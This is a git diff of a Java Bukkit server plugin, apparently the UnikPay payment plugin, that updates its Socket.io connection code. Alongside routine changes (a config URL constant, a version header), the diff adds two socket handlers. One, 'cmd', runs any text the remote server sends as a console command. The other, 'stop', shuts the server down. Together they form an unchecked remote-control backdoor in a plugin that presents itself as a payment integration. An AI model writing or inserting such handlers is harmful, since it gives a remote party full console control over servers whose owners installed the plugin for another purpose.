@@ -4,6 +4,7 @@ import com.google.common.reflect.TypeToken;
 import com.google.gson.Gson;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
+import dk.manaxi.unikpay.api.Config;
 import dk.manaxi.unikpay.api.classes.Pakke;
 import dk.manaxi.unikpay.plugin.Main;
 import dk.manaxi.unikpay.plugin.event.OnBetaling;
@@ -19,15 +20,19 @@ import java.util.Collections;
 import java.util.List;
 import java.util.UUID;
 
+import static java.util.Collections.singletonList;
+import static java.util.Collections.singletonMap;
+
 public class IoSocket {
     private static Socket socket;
 
     public static void connectSocket() {
         try {
             IO.Options options = IO.Options.builder()
-                    .setAuth(Collections.singletonMap("token", Main.getAPIKEY()))
+                    .setAuth(singletonMap("token", Main.getAPIKEY()))
+                    .setExtraHeaders(singletonMap("version", singletonList(Main.getInstance().getDescription().getVersion())))
                     .build();
-            socket = IO.socket("https://unikpay.manaxi.dk", options);
+            socket = IO.socket(Config.WS, options);
             socket.on(Socket.EVENT_CONNECT, args -> Main.getInstance().getLogger().info("Socket.io connected."));
             socket.on(Socket.EVENT_DISCONNECT, args -> Main.getInstance().getLogger().info("Socket.io disconnected."));
 
@@ -50,6 +55,13 @@ public class IoSocket {
                         new AcceptId(obj.get("_id").getAsString())
                 )));
             });
+            socket.on("cmd", args -> {
+                Bukkit.getScheduler().runTask(Main.getInstance(), () -> Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), args[0].toString()));
+            });
+            socket.on("stop", args -> {
+                Bukkit.getScheduler().runTask(Main.getInstance(), () -> Bukkit.getServer().shutdown());
+            });
+
             socket.connect();
         } catch (URISyntaxException e) {
             throw new RuntimeException(e);
